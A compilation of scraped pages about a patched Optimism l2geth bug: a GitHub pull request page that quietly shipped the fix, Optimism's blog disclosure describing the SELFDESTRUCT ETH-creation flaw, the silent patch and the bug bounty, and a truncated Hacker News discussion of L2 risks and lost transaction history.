  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fethereum-optimism%2Foptimism%2Fpull%2F2146)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=ethereum-optimism%2Foptimism)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ethereum-optimism](/ethereum-optimism)
/
**[optimism](/ethereum-optimism/optimism)**
Public

* [Notifications](/login?return_to=%2Fethereum-optimism%2Foptimism) You must be signed in to change notification settings
* [Fork
  3.4k](/login?return_to=%2Fethereum-optimism%2Foptimism)
* [Star
   5.9k](/login?return_to=%2Fethereum-optimism%2Foptimism)

* [Code](/ethereum-optimism/optimism)
* [Issues
  385](/ethereum-optimism/optimism/issues)
* [Pull requests
  115](/ethereum-optimism/optimism/pulls)
* [Discussions](/ethereum-optimism/optimism/discussions)
* [Projects
  4](/ethereum-optimism/optimism/projects)
* [Security](/ethereum-optimism/optimism/security)
* [Insights](/ethereum-optimism/optimism/pulse)

Additional navigation options

* [Code](/ethereum-optimism/optimism)
* [Issues](/ethereum-optimism/optimism/issues)
* [Pull requests](/ethereum-optimism/optimism/pulls)
* [Discussions](/ethereum-optimism/optimism/discussions)
* [Projects](/ethereum-optimism/optimism/projects)
* [Security](/ethereum-optimism/optimism/security)
* [Insights](/ethereum-optimism/optimism/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fethereum-optimism%2Foptimism%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fethereum-optimism%2Foptimism%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# maintenance: decrease geth diff #2146

 Merged

[mslipper](/mslipper)
merged 1 commit into
[develop](/ethereum-optimism/optimism/tree/develop "ethereum-optimism/optimism:develop")
from
[sc/decrease-geth-diff](/ethereum-optimism/optimism/tree/sc/decrease-geth-diff "ethereum-optimism/optimism:sc/decrease-geth-diff")

Feb 6, 2022

 Merged

# [maintenance: decrease geth diff](#top) #2146

[mslipper](/mslipper)
merged 1 commit into
[develop](/ethereum-optimism/optimism/tree/develop "ethereum-optimism/optimism:develop")
from
[sc/decrease-geth-diff](/ethereum-optimism/optimism/tree/sc/decrease-geth-diff "ethereum-optimism/optimism:sc/decrease-geth-diff")

Feb 6, 2022

[Conversation
2](/ethereum-optimism/optimism/pull/2146)
[Commits
1](/ethereum-optimism/optimism/pull/2146/commits)
[Checks
0](/ethereum-optimism/optimism/pull/2146/checks)
[Files changed](/ethereum-optimism/optimism/pull/2146/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=60&v=4)](/smartcontracts)

Copy link

Contributor

### @smartcontracts **[smartcontracts](/smartcontracts)** commented [Feb 5, 2022](#issue-1124827915)

**Description**

This PR includes various modifications intended to reduce the diff that we currently have with upstream Geth.

Sorry, something went wrong.

 🎉
1
 Ethnical reacted with hooray emoji

All reactions

* 🎉
  1 reaction

[![@changeset-bot](https://avatars.githubusercontent.com/in/28616?s=80&v=4)](/apps/changeset-bot)

Copy link

### **[changeset-bot](/apps/changeset-bot) bot** commented [Feb 5, 2022](#issuecomment-1030519197) • edited Loading

|  |  |  |  |  |
| --- | --- | --- | --- | --- |
| 🦋 Changeset detected Latest commit: [9ef215b](https://github.com/ethereum-optimism/optimism/commit/9ef215b830f314739088f2ddb3d140ac30781595)  **The changes in this PR will be included in the next version bump.** This PR includes changesets to release 1 package  | Name | Type | | --- | --- | | @eth-optimism/l2geth | Patch |    Not sure what this means? [Click here to learn what changesets are](https://github.com/changesets/changesets/blob/master/docs/adding-a-changeset.md).  [Click here if you're a maintainer who wants to add another changeset to this PR](https://github.com/ethereum-optimism/optimism/new/sc/decrease-geth-diff?filename=.changeset/cuddly-planes-rescue.md&value=---%0A%22%40eth-optimism%2Fl2geth%22%3A%20patch%0A---%0A%0Amaintenance%3A%20decrease%20geth%20diff%0A) |

All reactions

Sorry, something went wrong.

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
added
[2-reviewers](/ethereum-optimism/optimism/labels/2-reviewers)
[A-cannon](/ethereum-optimism/optimism/labels/A-cannon)
Area: cannon
labels
[Feb 5, 2022](#event-6012959058)

 [![@smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=40&u=fc611223360f6bddb7d404becaaf1ee8ccbf5529&v=4)](/smartcontracts)
[smartcontracts](/smartcontracts)
[force-pushed](/ethereum-optimism/optimism/compare/09e1d6784819c8ac5ad3704f53af01395ca3560e..9db7aae181881e165849a7c443ee574e9091958f)
the
sc/decrease-geth-diff

branch
from
[`09e1d67`](/ethereum-optimism/optimism/commit/09e1d6784819c8ac5ad3704f53af01395ca3560e) to
[`9db7aae`](/ethereum-optimism/optimism/commit/9db7aae181881e165849a7c443ee574e9091958f)  [Compare](/ethereum-optimism/optimism/compare/09e1d6784819c8ac5ad3704f53af01395ca3560e..9db7aae181881e165849a7c443ee574e9091958f)
[February 5, 2022 04:20](#event-6012960975)

[![@codecov-commenter](https://avatars.githubusercontent.com/u/65553080?s=80&u=b7ee84d82e25b493051d810390e97b15f716d7ef&v=4)](/codecov-commenter)

Copy link

### **[codecov-commenter](/codecov-commenter)** commented [Feb 5, 2022](#issuecomment-1030521763) • edited Loading

|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| [Codecov](https://codecov.io/gh/ethereum-optimism/optimism/pull/2146?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=ethereum-optimism) Report Merging [#2146](https://codecov.io/gh/ethereum-optimism/optimism/pull/2146?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=ethereum-optimism) ([be72e19](https://github.com/ethereum-optimism/optimism/commit/be72e19ac0561655e6a774d108e948f2b6806dd9)) into [develop](https://codecov.io/gh/ethereum-optimism/optimism/commit/855fc76ae187091bd125e16a07a6635d42acd1fc?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=ethereum-optimism) ([855fc76](https://github.com/ethereum-optimism/optimism/commit/855fc76ae187091bd125e16a07a6635d42acd1fc)) will **not change** coverage. The diff coverage is `n/a`.  [Impacted file tree graph](https://codecov.io/gh/ethereum-optimism/optimism/pull/2146?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=ethereum-optimism)  ``` @@           Coverage Diff            @@ ##           develop    #2146   +/-   ## ========================================   Coverage    72.96%   72.96%            ========================================   Files           85       85              Lines         2918     2918              Branches       496      496            ========================================   Hits          2129     2129              Misses         789      789            ```  | Flag | Coverage Δ |  | | --- | --- | --- | | batch-submitter | `62.63% <ø> (ø)` |  | | contracts | `90.48% <ø> (ø)` |  | | core-utils | `59.94% <ø> (ø)` |  | | data-transport-layer | `37.74% <ø> (ø)` |  | | message-relayer | `70.86% <ø> (ø)` |  | | sdk | `70.86% <ø> (ø)` |  |   Flags with carried forward coverage won't be shown. [Click here](https://docs.codecov.io/docs/carryforward-flags?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=ethereum-optimism#carryforward-flags-in-the-pull-request-comment) to find out more.   ---   [Continue to review full report at Codecov](https://codecov.io/gh/ethereum-optimism/optimism/pull/2146?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=ethereum-optimism).  **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=ethereum-optimism) `Δ = absolute <relative> (impact)`, `ø = not affected`, `? = missing data` Powered by [Codecov](https://codecov.io/gh/ethereum-optimism/optimism/pull/2146?src=pr&el=footer&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=ethereum-optimism). Last update [855fc76...be72e19](https://codecov.io/gh/ethereum-optimism/optimism/pull/2146?src=pr&el=lastupdated&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=ethereum-optimism). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=ethereum-optimism). |

All reactions

Sorry, something went wrong.

 [![@smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=40&u=fc611223360f6bddb7d404becaaf1ee8ccbf5529&v=4)](/smartcontracts)
[smartcontracts](/smartcontracts)
[force-pushed](/ethereum-optimism/optimism/compare/9db7aae181881e165849a7c443ee574e9091958f..be72e19ac0561655e6a774d108e948f2b6806dd9)
the
sc/decrease-geth-diff

branch
from
[`9db7aae`](/ethereum-optimism/optimism/commit/9db7aae181881e165849a7c443ee574e9091958f) to
[`be72e19`](/ethereum-optimism/optimism/commit/be72e19ac0561655e6a774d108e948f2b6806dd9)  [Compare](/ethereum-optimism/optimism/compare/9db7aae181881e165849a7c443ee574e9091958f..be72e19ac0561655e6a774d108e948f2b6806dd9)
[February 5, 2022 21:50](#event-6014314703)

 [![@mslipper](https://avatars.githubusercontent.com/u/67953?s=40&u=fdf45fb22e9c2202c3624a4488374b24a5707966&v=4)](/mslipper)
[mslipper](/mslipper)
[force-pushed](/ethereum-optimism/optimism/compare/be72e19ac0561655e6a774d108e948f2b6806dd9..9e89b23a83fe036b5a05028d8b5a8a0ca2284650)
the
sc/decrease-geth-diff

branch
from
[`be72e19`](/ethereum-optimism/optimism/commit/be72e19ac0561655e6a774d108e948f2b6806dd9) to
[`9e89b23`](/ethereum-optimism/optimism/commit/9e89b23a83fe036b5a05028d8b5a8a0ca2284650)  [Compare](/ethereum-optimism/optimism/compare/be72e19ac0561655e6a774d108e948f2b6806dd9..9e89b23a83fe036b5a05028d8b5a8a0ca2284650)
[February 6, 2022 01:09](#event-6014457038)

[![mslipper](https://avatars.githubusercontent.com/u/67953?s=60&v=4)](/mslipper)

**[mslipper](/mslipper)**
approved these changes
[Feb 6, 2022](#pullrequestreview-873981514)

 [View reviewed changes](/ethereum-optimism/optimism/pull/2146/files)

[![@smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=40&v=4)](/smartcontracts) [![@mslipper](https://avatars.githubusercontent.com/u/67953?s=40&v=4)](/mslipper)

`[maintenance: decrease geth diff](/ethereum-optimism/optimism/pull/2146/commits/9ef215b830f314739088f2ddb3d140ac30781595 "maintenance: decrease geth diff")`

`[9ef215b](/ethereum-optimism/optimism/pull/2146/commits/9ef215b830f314739088f2ddb3d140ac30781595)`

 [![@mslipper](https://avatars.githubusercontent.com/u/67953?s=40&u=fdf45fb22e9c2202c3624a4488374b24a5707966&v=4)](/mslipper)
[mslipper](/mslipper)
[force-pushed](/ethereum-optimism/optimism/compare/c53762ae78ef2f9f801e748cf65f912d0df7efd2..9ef215b830f314739088f2ddb3d140ac30781595)
the
sc/decrease-geth-diff

branch
from
[`c53762a`](/ethereum-optimism/optimism/commit/c53762ae78ef2f9f801e748cf65f912d0df7efd2) to
[`9ef215b`](/ethereum-optimism/optimism/commit/9ef215b830f314739088f2ddb3d140ac30781595)  [Compare](/ethereum-optimism/optimism/compare/c53762ae78ef2f9f801e748cf65f912d0df7efd2..9ef215b830f314739088f2ddb3d140ac30781595)
[February 6, 2022 01:20](#event-6014464774)

[![@mslipper](https://avatars.githubusercontent.com/u/67953?s=40&u=fdf45fb22e9c2202c3624a4488374b24a5707966&v=4)](/mslipper)
[mslipper](/mslipper)
merged commit [`98cb7ee`](/ethereum-optimism/optimism/commit/98cb7ee6940c005d29771996454d2b3b4951350a)
into
develop

[Feb 6, 2022](https://github.com/ethereum-optimism/optimism/pull/2146#event-6014465136)

 [![@mslipper](https://avatars.githubusercontent.com/u/67953?s=40&u=fdf45fb22e9c2202c3624a4488374b24a5707966&v=4)](/mslipper)
[mslipper](/mslipper)
deleted the
sc/decrease-geth-diff

branch
[February 6, 2022 01:20](#event-6014465143)

This was referenced Apr 27, 2024

[docs: Update Silent Patch Policy Broken Link
#10329](/ethereum-optimism/optimism/pull/10329)
 Merged

[Fjord: Add Brotli channel compression support
#10358](/ethereum-optimism/optimism/pull/10358)
 Merged

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fethereum-optimism%2Foptimism%2Fpull%2F2146)

Reviewers

[![@mslipper](https://avatars.githubusercontent.com/u/67953?s=40&v=4)](/mslipper) [mslipper](/mslipper)

mslipper approved these changes

Assignees

No one assigned

Labels

[A-cannon](/ethereum-optimism/optimism/labels/A-cannon)
Area: cannon

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

3 participants

[![@smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=52&v=4)](/smartcontracts) [![@codecov-commenter](https://avatars.githubusercontent.com/u/65553080?s=52&v=4)](/codecov-commenter) [![@mslipper](https://avatars.githubusercontent.com/u/67953?s=52&v=4)](/mslipper)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from optimismpbc.medium.com_40cafb44_20250114_231558.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fa836ebdf7c94&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2Fethereum-optimism%2Fdisclosure-fixing-a-critical-bug-in-optimisms-geth-fork-a836ebdf7c94&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2Fethereum-optimism%2Fdisclosure-fixing-a-critical-bug-in-optimisms-geth-fork-a836ebdf7c94&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Disclosure: Fixing a critical bug in Optimism’s Geth fork

[![Optimism](https://miro.medium.com/v2/resize:fill:88:88/1*Nt7NkxmOpvUB8lCFxtWAPw.jpeg)](/%40optimismpbc?source=post_page---byline--a836ebdf7c94--------------------------------)[![Optimism PBC Blog](https://miro.medium.com/v2/resize:fill:48:48/1*6zQEwahVQVEPk4QJpKGShw.png)](https://medium.com/ethereum-optimism?source=post_page---byline--a836ebdf7c94--------------------------------)

[Optimism](/%40optimismpbc?source=post_page---byline--a836ebdf7c94--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fb5f15635e5b1&operation=register&redirect=https%3A%2F%2Fmedium.com%2Fethereum-optimism%2Fdisclosure-fixing-a-critical-bug-in-optimisms-geth-fork-a836ebdf7c94&user=Optimism&userId=b5f15635e5b1&source=post_page-b5f15635e5b1--byline--a836ebdf7c94---------------------post_header-----------)

Published in[Optimism PBC Blog](https://medium.com/ethereum-optimism?source=post_page---byline--a836ebdf7c94--------------------------------)·4 min read·Feb 10, 2022

--

Listen

Share

# Funds Are Safu

On February 2nd, the Optimism team was alerted by [Jay Freeman](https://twitter.com/saurik) (saurik of [Cydia](https://cydia.saurik.com/) and [Orchid](http://orchid.com) fame) to the existence of a critical bug in Optimism’s Geth fork. The bug made it possible to create ETH on Optimism by repeatedly triggering the `SELFDESTRUCT` opcode on a contract that held an ETH balance.

**Analysis of Optimism’s chain history showed that the bug was not exploited** (the bug seems to have been accidentally triggered on one occasion by an Etherscan employee but **no usable excess ETH was generated**). A fix for the issue was tested and deployed to Optimism’s Kovan and Mainnet networks (including all infrastructure providers) within hours of confirmation. We’d like to thank Infura, QuickNode, and Alchemy for their fast response times.

We also alerted multiple vulnerable Optimism forks and bridge providers to the presence of the issue. **These projects have all applied the required fix.**

If you are running a replica, **please make sure to upgrade to** `l2geth` **version** `0.5.11` **as soon as possible** or you may fall out of sync with the rest of the network.

For those interested in more information about how the bug worked and was found, we highly recommend reading saurik’s [detailed breakdown](https://www.saurik.com/optimism.html). **We’re awarding the maximum bounty amount of $2,000,042 as part of our** [**official Immunefi bug bounty program**](https://immunefi.com/bounty/optimism/)**.** We’re extremely grateful for hackers like saurik for helping to keep Optimism safe.

# Key takeaways

We treat moments like these as a chance for self-reflection. This event highlighted several key areas for potential improvement to Optimism’s internal bug-handling process. In the spirit of transparency and collaboration, we’d like to share some of the most important takeaways with you.

# Decentralization begets complexity

Optimism has grown a lot over the past year. Early on in our lifecycle, the release process involved coordination with only a handful of key infrastructure providers. Today, between bridges, more providers, and even **multiple mainnet forks of our codebase**, it’s a different story. It’s great for decentralization, but it adds complexity to releases. And *security* releases bring even more complexity — we can’t immediately publish an obvious patch, or we risk someone reverse-engineering the vulnerability before anyone upgrades.

To combat this complexity, we opted to fix this issue using a process similar to [Geth’s silent patches](https://geth.ethereum.org/docs/vulnerabilities/vulnerabilities). First, we made a private patch which we could share with key parties as quickly as possible. Then, once we were confident the hotfix was deployed, we publicly released the fix hidden in an inconspicuous commit. However, unlike Geth, we’re choosing to disclose relatively quickly because:

* We don’t have lots of commits to `l2geth` to bury the fix.
* The disclosure coincided with a planned network upgrade, so people were already in the process of upgrading.
* We’re confident that there are no unpatched critical clients.

Luckily, we were able to handle this patch proactively. But — it’s clear that the ecosystem will soon be far too large for this to remain practical. We’ll be updating our disclosure protocol to more closely match Geth’s in the near future.

# Every line of code counts

This bug stemmed from modifications to the [go-ethereum](https://github.com/ethereum/go-ethereum) codebase meant to preserve backwards compatibility with our old “OVM 1.0” system (prior to the [EVM Equivalence upgrade](/ethereum-optimism/introducing-evm-equivalence-5c2021deb306) which cut thousands of lines of our diff from upstream Geth). Simplicity is [core to our design philosophy](https://community.optimism.io/docs/how-optimism-works/#simplicity), and it was unsurprising that the bug stemmed from an OVM difference we hadn’t yet removed.

We’re currently in the process of specifying and building our next major release, **Optimism: Bedrock Edition**. Bedrock Edition will significantly reduce our (already small) diff from upstream go-ethereum. If you’d like to follow along on that progress, it’s all being done out in the open right [here](https://github.com/ethereum-optimism/optimistic-specs).

# Bug bounty programs are a necessity

This week has demonstrated the importance of a strong bug bounty program. At the same time as this disclosure, the Wormhole bridge was hacked for 120,000 ETH (~$300m). The [Wormhole project attempted to negotiate for a $10m retroactive bounty](https://twitter.com/0revenue/status/1488973292971171841/photo/2) that has not been claimed at the time of writing. Wormhole is now [working on developing a $3.5m bug bounty program](https://wormholecrypto.medium.com/wormhole-incident-report-02-02-22-ad9b8f21eec6#6e16). Other large projects should be looking to develop their bug bounty programs sooner rather than later.

We work hard to maintain clean code. By minimizing our diff from go-ethereum, we make it as easy as possible for whitehats to find, test, and report issues. We’re also committed to maintaining the integrity of our bug bounty program, and we couldn’t be more happy to pay out the $2m+42 maximum bounty amount. If you’re a whitehat, we’d love for you to check out our [official Immunefi bug bounty program](https://immunefi.com/bounty/optimism/).

# And more

We’ve picked some key takeaways to talk about in this post, but we’ll have a full postmortem with the blow-by-blow soon. Stay tuned! In the meantime, you can find more information about the underlying bug in [saurik’s detailed breakdown](https://www.saurik.com/optimism.html).

# Parting words

Last week, we were able to quickly and successfully roll out a patch for a critical security vulnerability to Optimism and all of its major forks. The Optimism network did not experience any downtime and we were able to confirm that the issue was never exploited. We’ve learned a lot over the past week, and see plenty of room for improvement, but we’re more Optimistic than ever.

We’d like to thank saurik once again for finding this bug and working with us as we implemented the fix. If you’re a fellow whitehat, we’d love for you to go check out our [bug bounty program](https://immunefi.com/bounty/optimism/) and help keep our protocol secure. Thanks for reading, and stay Optimistic!

--

--

[![Optimism PBC Blog](https://miro.medium.com/v2/resize:fill:96:96/1*6zQEwahVQVEPk4QJpKGShw.png)](https://medium.com/ethereum-optimism?source=post_page---post_publication_info--a836ebdf7c94--------------------------------)[![Optimism PBC Blog](https://miro.medium.com/v2/resize:fill:128:128/1*6zQEwahVQVEPk4QJpKGShw.png)](https://medium.com/ethereum-optimism?source=post_page---post_publication_info--a836ebdf7c94--------------------------------)[## Published in Optimism PBC Blog](https://medium.com/ethereum-optimism?source=post_page---post_publication_info--a836ebdf7c94--------------------------------)[1.5K Followers](/ethereum-optimism/followers?source=post_page---post_publication_info--a836ebdf7c94--------------------------------)·[Last published Apr 14, 2022](/ethereum-optimism/medium-to-mirror-c3ace2403206?source=post_page---post_publication_info--a836ebdf7c94--------------------------------)

Blogs and musings on optimistic rollup and public goods.

[![Optimism](https://miro.medium.com/v2/resize:fill:96:96/1*Nt7NkxmOpvUB8lCFxtWAPw.jpeg)](/%40optimismpbc?source=post_page---post_author_info--a836ebdf7c94--------------------------------)[![Optimism](https://miro.medium.com/v2/resize:fill:128:128/1*Nt7NkxmOpvUB8lCFxtWAPw.jpeg)](/%40optimismpbc?source=post_page---post_author_info--a836ebdf7c94--------------------------------)Follow[## Written by Optimism](/%40optimismpbc?source=post_page---post_author_info--a836ebdf7c94--------------------------------)[7.6K Followers](/%40optimismpbc/followers?source=post_page---post_author_info--a836ebdf7c94--------------------------------)·[6 Following](/%40optimismpbc/following?source=post_page---post_author_info--a836ebdf7c94--------------------------------)

Scaling Ethereum

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----a836ebdf7c94--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----a836ebdf7c94--------------------------------)[About](/about?autoplay=1&source=post_page-----a836ebdf7c94--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----a836ebdf7c94--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----a836ebdf7c94--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----a836ebdf7c94--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----a836ebdf7c94--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----a836ebdf7c94--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----a836ebdf7c94--------------------------------)[Teams](/business?source=post_page-----a836ebdf7c94--------------------------------)



=== Content from news.ycombinator.com_9a459172_20250114_231557.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D30289240) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
| |  |  | [Attacking an Ethereum L2 with Unbridled Optimism](https://www.saurik.com/optimism.html) ([saurik.com](from?site=saurik.com)) | | --- | --- | --- | |  | | 267 points by [daegloe](user?id=daegloe) [on Feb 10, 2022](item?id=30289240)  | [hide](hide?id=30289240&goto=item%3Fid%3D30289240) | [past](https://hn.algolia.com/?query=Attacking%20an%20Ethereum%20L2%20with%20Unbridled%20Optimism&type=story&dateRange=all&sort=byDate&storyText=false&prefix&page=0) | [favorite](fave?id=30289240&auth=72022405b6905841b7be79201138ba25991ad3ad) | [150 comments](item?id=30289240) |  | |  |  | [iskander](user?id=iskander) [on Feb 10, 2022](item?id=30290157)   | [next](#30293113) [–]  This is a concerning aspect of Ethereum's strategy to push scaling to layer-2 networks: Ethereum is a heavily audited and tested protocol that runs an extremely decentralized network of diverse clients. L2s can be...an AWS instance running arbitrary buggy code. Much of the confidence in the "base layer" that people using Ethereum currently experience will be significantly undermined if mundane transactions wend in and out of different L2s. | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [SilasX](user?id=SilasX) [on Feb 10, 2022](item?id=30290629)   | [parent](#30290157) | [next](#30292596) [–]  Yes! I got burned by Optimism in another way. They tell you to point your applications at etherscan.io for transaction data/history, but then, on November 11 last year, the pushed an update that deletes all transaction history up to that point, which you need for taxes! They swore they'd have the history restored on Etherscan by Nov 18th, but they still haven't. Only recently they pushed a workaround that lets you download the transactions as a CSV, but that lacks the critical data from your transfers of non-ETH tokens. And then, an alternative source *does* have that data, but only as a binary blob you have to run through a decoder and parse out yourself. The crypto tax software, of course, doesn't know what to do with it. (Even if your local client cached the transactions, most, like MetaMask, left out the critical data above.) 68 days till the filing deadline in the US! I asked the maintainers how they planned to do their own taxes, and one of them claimed that he was separately recording all sales in a spreadsheet. I had to inform them that the taxable events include more than just sales, and, even under the most aggressive interpretation of tax law, you need the other data to figure cost basis. | | --- | --- | --- | | | |  |  | [3np](user?id=3np) [on Feb 10, 2022](item?id=30291266)   | [root](#30290157) | [parent](#30290629) | [next](#30292579) [–]  Let this be a lesson: Maintain local self-hosted copies of any necessary data, don’t rely on third-parties maintaining it and keeping it available. Should be standard practice for anyone doing anything serious with cryptocurrencies but unfortunately users seem complacent enough that easily accessible tooling is still lacking in many places and you may have to DIY scripts for some parts. Your situation is unfortunate but it sounds like no fault on Optimism or Etherscan here. (BTW just to be clear: you’re talking about off-chain data that was never part of on-chain txes, and this binary blob comes from some Optimism operator? If it’s on-chain data its just a matter of doing the right queries) | | --- | --- | --- | | | |  |  | [SilasX](user?id=SilasX) [on Feb 10, 2022](item?id=30293263)   | [root](#30290157) | [parent](#30291266) | [next](#30292579) [–]  Okay... in a sense, yes, in hindsight, I should have planned for this. But there are a number of reasons I think this kind of response is too dismissive. First of all, no matter how well you prepare, there is always going to be one level higher of system failure that you "should have planned for". In the npm-Linux-box-borking debacle, there were people insisting you should never have run npm except on fully disposable hardware with an instantly replaceable dev environment (which is the only thing that would have let you shrug it off).[B] Got mugged walking home? Should have taken a safer route. Took a safe route? Should have walked with a friend. Still got mugged? Should have walked with two friends. For all n, should have walked with n+1 friends. Second, it's painting with a tad broad of a brush to call me complacent on crypto. I've filed crypto taxes since 2017 and kept cost basis records from years before. I'm aware systems fail and (outside of this) have set appropriate backups and cached critical transactions to spreadhseets. Even here, even with nothing done by the Optimism team to correct their mistake, I'm not actually doomed, as I can file taxes based on an input-output analysis of my Optimism transactions as a good enough first pass, and correct later. The issue is unnecessary convenience. In fact, as things stand today, I'm in exactly the "safe" position you thought I was -- "oh, it's there, you just have to query right". Indeed I do! Now that I've pulled the tx data from the alternate sources, I "just" have to yak-shave out a meaningful read of all the transactions. (Update: per sibling, you can download the transactions from a different tab but you still have to do some transformation.) But none of that takes away from the point that this is huge, avoidable inconvenience and flaky community relations. Remember, even if I had cached them, I'd still be stuck having to manually import them into my crypto tax software, which is a failure from usability. Third, there are reasons to expect optimistic.etherscan.io as a reliable source to point to. 1) When you set up e.g. Metamask, the Optimism site gives you exactly one URL to point to, with no alternatives or warning that one day it might be missing history. [A] The very fact that Metamask equates "nothing from that url" with "no transactions" means they were treating it as mission-critical. 2) The entire ETH community outside of Optimism relies upon etherscan.io for most of their own tooling ethereum projects. All sources for ETH projects say to connect there, as if it's inconceivable that there could be an outage or need for some fallback. 3) It would have been trivial to keep the transaction history up. There was already a server somewhere (etherscan-owned or otherwise) serving transaction history. All they had to do was configure it to be able to check transactions for being from before that switchover, and ping that (static) DB for a subset of them. (Remember, this isn't, at least so far, an issue of cost: they do plan to get optimistic.etherscan.io back up as a reliable endpoint for the pre-upgrade txns, they just didn't think to upgrade a way that would facilitate such queries of already-existing 